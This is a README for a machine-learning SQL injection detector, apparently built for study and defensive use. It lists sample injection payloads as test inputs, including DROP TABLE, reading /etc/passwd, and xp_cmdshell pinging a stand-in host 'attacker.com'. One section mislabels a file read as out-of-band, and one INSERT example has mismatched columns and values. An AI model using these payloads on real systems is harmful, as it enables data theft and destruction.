# SQL Injection Detector

This project is a machine learning-based SQL Injection Detector that uses a stacking ensemble of classifiers to detect SQL injection attempts in user queries. The model is trained on a dataset of SQL queries labeled as either safe or malicious. The project is inspired by the research paper titled ["A Machine Learning Approach for Detecting SQL Injection Attacks"](https://ieeexplore.ieee.org/document/9792964) and uses the dataset available on [Kaggle](https://www.kaggle.com/datasets/syedsaqlainhussain/sql-injection-dataset?resource=download&select=sqliv2.csv).

## Overview

SQL injection is a code injection technique that might destroy your database. It is one of the most common web hacking techniques. This project aims to detect SQL injection attempts by analyzing the structure and content of SQL queries using machine learning techniques.

## Dataset

The dataset used in this project is available on Kaggle and contains a collection of SQL queries labeled as either safe (0) or malicious (1). The dataset is preprocessed to remove any missing values and then transformed using TF-IDF (Term Frequency-Inverse Document Frequency) to convert the text data into a numerical format suitable for machine learning models.

## Steps in the Notebook

1. **Importing Libraries**: The necessary libraries such as `numpy`, `pandas`, `scikit-learn`, `xgboost`, and `lightgbm` are imported. These libraries are used for data manipulation, model training, and evaluation.

2. **Loading the Dataset**: The dataset is loaded using `pandas`. The dataset contains two columns: `Query` (the SQL query) and `Label` (0 for safe, 1 for malicious).

3. **Preprocessing**: The dataset is cleaned by removing any rows with missing values. The `Query` column is then transformed using `TfidfVectorizer` to convert the text data into a numerical format. This step is crucial because machine learning models require numerical input.

4. **Splitting the Dataset**: The dataset is split into training and testing sets using `train_test_split`. The split is stratified to ensure that the proportion of labels is maintained in both sets.

5. **Defining Base Learners**: Four base learners are defined: `GradientBoostingClassifier`, `AdaBoostClassifier`, `XGBClassifier`, and `LGBMClassifier`. These classifiers are used as part of a stacking ensemble.

6. **Stacking Classifier**: A `StackingClassifier` is created using the base learners and a `LogisticRegression` model as the final estimator. The stacking classifier combines the predictions of the base learners to improve overall performance.

7. **Training and Evaluation**: The stacking classifier is trained on the training data and evaluated on the test data. Metrics such as accuracy, ROC AUC score, and F1 score are calculated to assess the model's performance.

8. **User Input and Prediction**: The model is used to predict whether a user-input SQL query is safe or malicious. The query is transformed using the same `TfidfVectorizer` and passed to the model for prediction.

## Results

The model achieves high accuracy, ROC AUC score, and F1 score, indicating that it is effective at detecting SQL injection attempts. The results are printed to the console, and the model can be used to predict the safety of user-input SQL queries.

## Usage

To use the model, simply run the notebook and input an SQL query when prompted. The model will output whether the query is predicted to be safe or malicious, along with a risk score.

## 🚀 Queries for Testing - SQL Injection

Below are some sample SQL injection queries for different types of attacks. These queries can be used for testing and securing applications against SQL injection vulnerabilities.

---

## 🚀 Boolean-Based SQL Injection
Bypass authentication or extract information using `OR` conditions.

```sql
' OR 1=1; --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1; --';
```

---

## 🚀 Union-Based SQL Injection
Extract data from other tables by combining the result with a `UNION`.

```sql
' UNION SELECT username, password FROM admin_users; --
```
**Example:**
```sql
SELECT id, username FROM users WHERE id = 1 UNION SELECT id, password FROM admin_users;
```

---

## 🚀 Error-Based SQL Injection
Trigger database errors to reveal information.

```sql
' AND 1=CONVERT(int, (SELECT @@version)); --
```
**Example:**
```sql
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version)); --
```

---

## 🚀 Blind (Time-Based) SQL Injection
Infer information by checking server response time.

```sql
' OR IF(1=1, SLEEP(5), 0); --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND IF(1=1, SLEEP(5), 0); --
```

---

## 🚀 Out-of-Band SQL Injection
Send data to an external server using network calls.

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'); --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' UNION SELECT LOAD_FILE('/etc/passwd'); --
```

---

## 🚀 Stacked Queries (Batch Execution)
Execute multiple statements by chaining with `;`.

```sql
'; DROP TABLE users; --
```
**Example:**
```sql
INSERT INTO orders (product, quantity, price) VALUES ('story', 58); DROP TABLE orders; --
```

---

## 🚀 Extract Database Info (Metadata)
Get table structure or other metadata.

```sql
' UNION SELECT table_name FROM information_schema.tables; --
```
**Example:**
```sql
SELECT username FROM users UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
```

---

## 🚀 Command Injection via xp_cmdshell
Execute system commands (on MS SQL Server).

```sql
' ; EXEC xp_cmdshell('ping -n 1 attacker.com'); --
```
**Example:**
```sql
SELECT * FROM users WHERE id = 1; EXEC xp_cmdshell('ping -n 1 attacker.com'); --
```

---

## 🚀 Cast-Based Injection
Exploit type casting to extract information.

```sql
' AND 1=CAST('abc' AS int); --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND CAST('abc' AS int) = 1;
```

---

## 🚀 Subquery Injection
Extract nested information using subqueries.

```sql
' AND (SELECT password FROM admin WHERE id=1) = 'admin'; --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND (SELECT password FROM admin WHERE id=1) = 'admin'; --
```

---

**⚠️ Disclaimer:** Use these queries for educational and testing purposes only. Do not use them for malicious intent. 

## 🚀 Queries for Testing - NON SQL Injection

---

## ✅ **1. Safe SELECT Queries**
Retrieve data from the database securely.

```sql
SELECT * FROM users WHERE id = 1;
```
**Example:**
```sql
SELECT username, email FROM users WHERE id = 42;
```

---

## ✅ **2. Parameterized Queries (Prevent Injection)**
Use parameterized queries to avoid injection.

```sql
PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';
EXECUTE stmt USING @user_id;
```
**Example:**
```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

## ✅ **3. Safe UPDATE Queries**
Securely update data based on valid parameters.

```sql
UPDATE accounts SET balance = 531 WHERE account_id = 1;
```
**Example:**
```sql
UPDATE products SET stock = stock - 1 WHERE id = 101;
```

---

## ✅ **4. Safe INSERT Queries**
Insert new data into the table.

```sql
INSERT INTO orders (product, quantity, price) VALUES ('story', 58);
```
**Example:**
```sql
INSERT INTO users (username, email, password) VALUES ('john_doe', 'john@example.com', 'password123');
```

---

## ✅ **5. Safe DELETE Queries**
Delete records securely.

```sql
DELETE FROM users WHERE id = 101;
```
**Example:**
```sql
DELETE FROM orders WHERE status = 'cancelled';
```

---

## ✅ **6. GRANT and REVOKE Permissions**
Control user permissions securely.

```sql
GRANT SELECT, UPDATE ON database_name.* TO 'user'@'localhost';
```
**Example:**
```sql
REVOKE DELETE ON database_name.* FROM 'user'@'localhost';
```

---

## ✅ **7. UNION Queries for Data Merging**
Combine results from two `SELECT` statements securely.

```sql
SELECT id, username FROM users UNION SELECT id, name FROM customers;
```
**Example:**
```sql
SELECT name, age FROM customers WHERE id = 1 UNION SELECT 'Guest', 25;
```

---

## ✅ **8. JOIN Queries**
Combine data from multiple tables securely.

```sql
SELECT u.id, u.username, o.order_date 
FROM users u 
JOIN orders o ON u.id = o.user_id;
```
**Example:**
```sql
SELECT c.name, p.product_name 
FROM customers c 
JOIN purchases p ON c.id = p.customer_id;
```

---

## ✅ **9. Use Stored Procedures**
Use stored procedures to prevent direct query execution.

```sql
CALL GetUserDetails(@user_id);
```
**Example:**
```sql
CREATE PROCEDURE GetUserDetails(IN user_id INT)
BEGIN
    SELECT * FROM users WHERE id = user_id;
END;
```

---

## ✅ **10. Avoid Dynamic SQL**
Avoid building SQL strings with user input directly.

❌ **Bad Example:**
```sql
query = "SELECT * FROM users WHERE id = " + user_id;
```

✅ **Good Example:**
```sql
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

---

**⚠️ Best Practice:**  
- Always use **prepared statements** or **parameterized queries**.  
- Avoid using `EXEC`, `xp_cmdshell`, or dynamic SQL unless necessary.  

---

## References

- ["A Machine Learning Approach for Detecting SQL Injection Attacks"](https://ieeexplore.ieee.org/document/9792964)
- [SQL Injection Dataset on Kaggle](https://www.kaggle.com/datasets/syedsaqlainhussain/sql-injection-dataset?resource=download&select=sqliv2.csv)

## Conclusion

This project demonstrates the effectiveness of using machine learning techniques to detect SQL injection attempts. By leveraging a stacking ensemble of classifiers, the model achieves high performance and can be used to enhance the security of web applications.
